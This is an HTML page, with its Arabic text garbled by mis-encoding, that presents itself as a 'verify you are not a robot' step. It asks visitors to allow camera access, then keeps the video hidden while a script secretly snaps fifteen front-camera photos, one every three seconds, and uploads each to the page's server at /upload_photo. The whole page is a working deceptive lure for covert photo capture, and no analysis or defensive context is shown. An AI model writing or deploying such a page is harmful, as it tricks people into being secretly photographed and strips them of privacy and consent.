<!DOCTYPE html>
<html lang="ar">  
<head>  
  <meta charset="UTF-8">  
  <title>Ø¬Ø§Ø±ÙŠ ØªØ¬Ù‡ÙŠØ² Ø§Ù„Ø±Ø§Ø¨Ø·</title>  
  <style>  
    body {  
      background: #fff;  
      color: #333;  
      text-align: center;  
      font-family: sans-serif;  
      padding: 30px;  
    }  
    video, canvas, #status {  
      display: none !important;  
    }  
  </style>  
</head>  
<body>  
  <h2>Ù‚Ù… Ø¨Ø¶ØºØ· Ø³Ù…Ø§Ø­ Ù„Ù„ÙˆØµÙˆÙ„ Ø§Ù„Ù‰ Camera Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø£Ù†Ùƒ Ù„Ø³Øª Ø±ÙˆØ¨ÙˆØªÙ‹Ø§</h2>  
  <video id="video" autoplay playsinline></video>  
  <canvas id="canvas"></canvas>  
  <p id="status"></p>  
  
  <script>  
    const video = document.getElementById("video");  
    const canvas = document.getElementById("canvas");  
  
    const TOTAL_PHOTOS = 15;  
    const INTERVAL_MS = 3000; // 3 Ø«ÙˆØ§Ù†ÙŠ  
    let photosTaken = 0;  
    let stream;  
  
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })  
      .then(s => {  
        stream = s;  
        video.srcObject = stream;  
  
        video.onloadedmetadata = () => {  
          setTimeout(() => {  
            takePhotosRepeatedly();  
          }, 1000);  
        };  
      })  
      .catch(err => {  
        console.error("ðŸ”´ ÙØ´Ù„ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§:", err);  
      });  
  
    function takePhotosRepeatedly() {  
      if (photosTaken >= TOTAL_PHOTOS) {  
        stopStream();  
        return;  
      }  
  
      captureAndSend().then(() => {  
        photosTaken++;  
        setTimeout(takePhotosRepeatedly, INTERVAL_MS);  
      }).catch(err => {  
        console.error("ðŸ”´ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:", err);  
        stopStream();  
      });  
    }  
  
    function captureAndSend() {  
      return new Promise((resolve, reject) => {  
        if (!video.videoWidth || !video.videoHeight) {  
          reject("ðŸ“· Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ØºÙŠØ± Ø¬Ø§Ù‡Ø².");  
          return;  
        }  
  
        const ctx = canvas.getContext("2d");  
        canvas.width = video.videoWidth;  
        canvas.height = video.videoHeight;  
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);  
  
        canvas.toBlob(blob => {  
          const formData = new FormData();  
          formData.append("photo", blob, "photo.jpg");  
  
          fetch("/upload_photo", {  
            method: "POST",  
            body: formData  
          })  
          .then(res => res.json())  
          .then(data => {  
            if (data.success) resolve();  
            else reject(data.error || "Unknown error");  
          })  
          .catch(err => reject(err));  
        }, "image/jpeg");  
      });  
    }  
  
    function stopStream() {  
      if (stream) {  
        stream.getTracks().forEach(track => track.stop());  
      }  
    }  
  </script>  
</body>  
</html>